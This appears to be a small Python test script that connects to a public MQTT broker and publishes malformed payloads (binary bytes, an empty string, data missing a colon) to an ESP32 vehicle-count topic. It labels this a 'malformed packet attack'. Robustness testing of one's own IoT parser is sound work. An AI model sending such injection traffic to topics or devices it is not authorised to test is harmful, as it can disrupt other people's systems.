import paho.mqtt.client as mqtt
import time

broker = "broker.emqx.io"
topic = "esp32/vehicle_count"
client = mqtt.Client(protocol=mqtt.MQTTv311)


def on_connect(client, userdata, flags, rc):
    if rc == 0:
        print("Connected to broker")
    else:
        print(f"Failed to connect: {rc}")


client.on_connect = on_connect
client.connect(broker, 1883, 60)
client.loop_start()

print("Starting malformed packet attack...")
malformed_payloads = [
    b"\x00\xff\x00",  # Non-UTF-8 binary data
    "",  # Empty payload
    "InvalidData",  # Missing colon
]

try:
    for payload in malformed_payloads:
        client.publish(topic, payload)
        print(f"Sent malformed payload: {payload}")
        time.sleep(1)
except KeyboardInterrupt:
    print("Attack stopped")
    client.loop_stop()
    client.disconnect()
